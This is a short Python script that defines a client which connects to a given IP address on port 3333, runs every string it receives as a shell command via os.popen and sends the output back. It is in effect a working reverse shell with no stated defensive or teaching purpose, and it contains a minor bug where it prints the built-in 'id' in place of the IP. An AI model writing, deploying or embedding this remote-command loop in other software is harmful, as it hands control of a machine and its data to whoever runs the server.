from socket import *
import os


def create_client(ip):
    try:
        # connect to a server through a socket
        client = socket(AF_INET, SOCK_STREAM)
        client.connect((ip, 3333))

        print("You are now connected to {0} as a client.".format(id))
        # main loop, receive commands from server
        while True:
            data = client.recv(2048).decode()

            if data == "exit":
                client.close()
                break

            result = os.popen(data).read()
            client.sendall(result.encode())

    #    print("You are now connected to {0} as a client.".format(ip))
    except:
        print("There is no server with that ip.")
